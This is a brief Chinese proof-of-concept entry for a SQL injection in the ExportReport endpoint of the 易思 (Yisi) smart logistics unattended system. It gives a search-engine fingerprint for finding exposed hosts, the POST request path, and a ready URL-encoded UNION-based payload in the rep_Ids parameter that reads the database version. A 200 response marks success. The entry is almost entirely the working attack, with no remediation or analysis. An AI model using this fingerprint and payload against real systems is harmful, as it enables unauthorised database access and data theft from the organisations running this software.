# 易思智能物流无人值守系统ExportReportSQL注入漏洞

易思智能物流无人值守系统ExportReport ｜ SQL注入 ｜ —
- **指纹**：`body="/api/SingleLogin"`
- **请求**：`POST /Sys_ReportFile/ExportReport HTTP/1.1`

**Payload**
```
rep_Ids=1%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C@@VERSION%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+CdNX
```
- **响应特征**：200